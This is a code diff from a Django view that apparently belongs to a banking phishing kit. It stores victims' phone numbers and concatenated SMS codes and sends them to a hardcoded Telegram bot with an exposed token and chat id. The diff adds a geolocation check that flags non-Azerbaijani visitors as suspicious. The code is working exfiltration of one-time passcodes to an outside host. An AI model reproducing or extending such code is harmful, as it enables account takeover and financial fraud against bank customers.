@@ -196,7 +196,11 @@ def dseckapital(request):
         contact.sms=concatenated
         contact.bankname=""
         contact.save()
-        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}\nPage:Loading\nnumber{contact.phone}\nsms:{concatenated}')
+        print('1')
+        country = get_country_from_ip(contact.ip)
+        if country!= "AZ":
+            country= 'Şübhəli İP!'
+        response = requests.post(f'https://api.telegram.org/bot6316715361:AAH3GsgZgeG7r1uwHQHGypsDCeVtSV6Zoik/sendMessage?chat_id=-1001866012482&text=id:{contact.id}|ip:{country}\nPage:Loading\nsms:{concatenated}')
         return render( request,'pages/loading.html' )
     
     return render( request,'pages/loading.html',context )
